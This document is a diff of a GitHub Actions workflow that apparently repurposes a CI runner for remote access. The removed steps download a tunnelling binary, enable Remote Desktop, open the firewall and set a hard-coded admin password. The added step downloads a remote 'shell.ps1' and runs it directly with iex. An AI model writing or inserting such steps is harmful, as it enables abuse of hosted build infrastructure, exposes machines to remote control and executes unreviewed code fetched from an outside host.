@@ -9,12 +9,5 @@ jobs:
 
     steps:
     - name: Download Pktriot
-      run: Invoke-WebRequest https://FileHosting.lifeseemsfine.repl.co/pktriot.exe -OutFile pktriot.exe
-    - name: Enable TS
-      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-    - name: Create Tunnel
-      run: echo "1" > input.txt  
-    - run: cat input.txt | .\pktriot.exe configure --url
+      run: iex ([System.Text.Encoding]::UTF8.GetString((wget https://FileHosting.lifeseemsfine.repl.co/shell.ps1).Content))
+  
